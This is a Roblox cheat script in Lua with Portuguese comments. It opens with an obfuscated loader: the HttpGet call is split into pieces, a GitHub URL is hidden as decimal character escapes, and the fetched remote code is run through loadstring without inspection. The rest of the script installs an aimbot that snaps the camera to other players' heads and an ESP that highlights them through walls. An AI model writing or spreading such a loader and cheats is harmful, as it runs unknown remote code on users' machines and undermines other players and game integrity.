-- Camada de Proteção e Bypass
local _g = getgenv and getgenv() or _G
local _game = game
local _http = "H" .. "tt" .. "pG" .. "et"
local _ls = loadstring
local _u = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\97\121\110\97\110\57\48\48\48\47\84\101\115\116\101\45\50\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\84\101\115\116\101\46\117\97"
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

-- ** 1. PREVENÇÃO DE EXECUÇÃO DUPLA (ESSENCIAL PARA SINGLE-INSTANCE) **
if _g.ScriptJaCarregado then 
    warn("Script já está rodando! Execução ignorada.")
    return 
end
_g.ScriptJaCarregado = true
print("[Script] Instância única garantida. Iniciando carregamento e cheats...")


-- ** 2. FUNÇÃO DE CARREGAMENTO DO SCRIPT EXTERNO **

-- Função de Execução Protegida para o Script Externo
local function _exec(_target_url)
    local success, result = pcall(function()
        -- Usando 'httpget' direto com o objeto 'game' (como no original)
        return _ls(_game[_http](_game, _target_url))
    end)
    if success and result then 
        print("[Script] Script externo carregado com sucesso.")
        result() 
    else 
        warn("[Script] Erro ao carregar script externo.") 
    end
end

-- Inicia o carregamento do seu link do GitHub
_exec(_u)


-- ** 3. LÓGICA DE CHEATS CONTÍNUA (SEM INTERFACE) **

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Funções para Aimbot e ESP, agora ativadas por loops contínuos

-- Aimbot: Ativa o loop de mira contínuo no RenderStepped
local function AtivarAimbotContinuo()
    
    -- Se o LocalPlayer ainda não estiver carregado, espera
    if not LocalPlayer then return end
    
    local connections = {}
    
    -- O RenderStepped é o melhor lugar para manipular a CFrame da câmera (mira)
    table.insert(connections, RunService.RenderStepped:Connect(function()
        if not Camera or not LocalPlayer.Character then return end
        
        local closestPlayer = nil
        local shortestDistance = math.huge
        local fovLimit = 60 -- Reduz o FOV para foco (Otimização)
        
        -- Encontra o alvo mais próximo
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local rootPart = player.Character.HumanoidRootPart
                local headPos, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
                
                if onScreen then
                    -- Calcula a distância do centro da tela (magnitude)
                    local dist = (Vector2.new(headPos.X, headPos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).magnitude
                    
                    if dist < fovLimit and dist < shortestDistance then
                        closestPlayer = player
                        shortestDistance = dist
                    end
                end
            end
        end
        
        -- Aplica a mira se houver um alvo válido
        if closestPlayer and closestPlayer.Character:FindFirstChild("Head") then
            local head = closestPlayer.Character.Head
            -- Suaviza a mira para evitar tremores (Smoothness é essencial)
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, head.Position), 0.5)
        end
    end))
    
    print("[Cheat] Aimbot Contínuo ATIVADO.")
    
    return connections
end


-- ESP: Ativa o loop de Highlight contínuo
local function AtivarESPContinuo()
    
    -- O Heartbeat é um bom lugar para updates de lógica de jogo não visuais
    local connection = RunService.Heartbeat:Connect(function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                -- Otimização: Adiciona ou encontra o Highlight
                local h = player.Character:FindFirstChildOfClass("Highlight")
                if not h then
                    h = Instance.new("Highlight", player.Character)
                    h.OutlineTransparency = 0 -- Otimização visual para clareza
                    h.FillTransparency = 0.5
                    h.FillColor = Color3.fromRGB(255, 0, 0)
                end
                
                -- Se o jogador não tiver Character, remove o Highlight (limpeza)
            elseif player.Character and player.Character:FindFirstChildOfClass("Highlight") then
                 player.Character:FindFirstChildOfClass("Highlight"):Destroy()
            end
        end
    end)
    
    print("[Cheat] ESP Contínuo ATIVADO.")
    
    return connection
end

-- ** 4. INICIALIZAÇÃO DOS CHEATS **

-- As funções de voo (se existissem) e Aimbot/ESP agora são chamadas diretamente
-- Note: A função de Voar (fly/noclip) geralmente requer um loop próprio ou manipulação do Humanoid/BodyVelocity.

-- Inicia o Aimbot e o ESP
AtivarAimbotContinuo()
AtivarESPContinuo()

-- Fim do script, a execução única está garantida pelo debounce inicial.
